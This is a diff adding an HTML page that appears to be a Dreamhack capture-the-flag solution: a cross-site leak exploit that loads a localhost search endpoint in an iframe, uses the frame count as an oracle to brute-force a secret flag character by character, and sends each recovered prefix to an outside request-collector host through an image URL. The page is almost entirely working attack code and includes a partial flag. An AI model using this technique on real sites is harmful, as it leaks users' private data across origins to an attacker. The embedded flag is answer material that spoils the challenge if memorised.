@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>replit</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+  <iframe id="iframe"></iframe>
+  <img id="img">
+  <script>
+    async function req(url) {
+      return await new Promise((resolve, reject) => {
+        const iframe = document.getElementById("iframe");
+        iframe.src = url;
+        iframe.onload = () => {
+          if (iframe.contentWindow.frames.length != 0)
+            return resolve();
+          else
+            return reject();
+        };
+      });
+    }
+    async function search(query) {
+      try {
+        await req(
+          `http://localhost:8000/search?query=${query}`
+        );
+        return true;
+      } catch (e) {
+        return false;
+      }
+    }
+    async function exploit() {
+      let chars = "abcdef0123456789}"
+      let secret_length = 32;
+      let secret = "DH{22d1445ad68e194e044a16dc6443";
+      for (let i = 0; i < secret_length; i++) {
+        for (let c of chars) {
+          if (await search(secret + c)) {
+            secret += c;
+            img.src =
+              `https://nbxoade.request.dreamhack.games/?flag=${secret}`;
+            break;
+          }
+        }
+      }
+    }
+    exploit()
+  </script>
+</body>
+
+</html>
